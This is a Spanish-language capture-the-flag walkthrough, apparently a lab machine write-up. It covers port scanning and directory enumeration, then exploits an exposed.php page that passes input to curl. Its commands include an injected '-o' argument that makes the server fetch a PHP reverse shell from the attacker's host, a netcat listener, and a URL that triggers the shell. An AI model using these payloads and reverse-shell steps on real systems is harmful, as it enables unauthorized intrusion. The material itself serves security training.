
NMAP
```
nmap -p- -Pn -sS -sV 10.10.10.24
```
![[Pasted image 20260114182337.png]]
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.10.0 (Ubuntu)

GOBUSTER
```
gobuster dir -u http://10.10.10.24/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php
```
![[Pasted image 20260114183624.png]]
uploads                  (Status: 301) [Size: 194] [--> http://10.10.10.24/uploads/]
exposed.php          (Status: 200) [Size: 446]

```
http://10.10.10.24/exposed.php
```
![[Pasted image 20260114183747.png]]
Si pulsamos el botón sin tener nada escrito observamos que se ejecuta curl en cada consulta
![[Pasted image 20260114183855.png]]

Obtenemos una shell para subirla al servidor mediante curl y así obtener acceso al servidor.

Ruta de la shell PHP:
```
ls /usr/share/webshells/php
```
![[Pasted image 20260114184223.png]]
Copiamos el archivo php-reverse-shell.php al home
```
cp /usr/share/webshells/php/php-reverse-shell.php shell2.php
```
Modificamos la shell para que apunte a nuestro servidor y en este caso lo haremos usando el puerto 8000
```
nano shell2.php
```
![[Pasted image 20260114184453.png]]
$ip = '10.10.14.37';  // CHANGE THIS
$port = 8000;       // CHANGE THIS

Para cargar la shell habilitamos el puerto 80 mediante python
```
python3 -m http.server 80
```
Cargamos la shell en el servidor web
```
http://10.10.14.37/shell2.php -o uploads/shell.php
```
![[Pasted image 20260114185230.png]]

Una vez subida, lanzamos un netcat en escucha en el mismo puerto que la shell cargada
```
nc -lvnp 8000
```
Accedemos a la shell por la URL
```
http://10.10.10.24/uploads/shell2.php
```
Observamos que hemos obtenido acceso al servidor
![[Pasted image 20260114185448.png]]